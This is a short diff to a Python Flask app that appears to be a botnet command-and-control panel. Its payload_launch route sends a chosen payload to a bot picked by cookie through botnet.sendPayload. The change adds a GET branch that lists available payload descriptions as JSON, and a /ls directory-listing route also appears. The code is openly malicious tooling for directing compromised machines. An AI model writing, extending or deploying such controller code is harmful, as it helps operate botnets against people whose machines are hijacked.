@@ -110,11 +110,14 @@ def payload_launch():
     payload_name = "example_payload"
     if request.method == 'POST' and 'payload' in request.form:
         payload_name = request.form.get('payload')
-    if 'bot' in request.cookies:
-        botnet.sendPayload(request.cookies.get('bot'), payload_name)
-        return "done"
-    else:
-        return "No bot selected", 404
+        if 'bot' in request.cookies:
+            botnet.sendPayload(request.cookies.get('bot'), payload_name)
+            return "done"
+        else:
+            return "No bot selected", 404
+    elif request.method == 'GET':
+        payloadstr = json.dumps(botnet.getPayloadDescriptions())
+        return Response(payloadstr, status=200, mimetype='application/json')
 
 @app.route('/ls', methods=['GET','POST'])
 def list_dir():
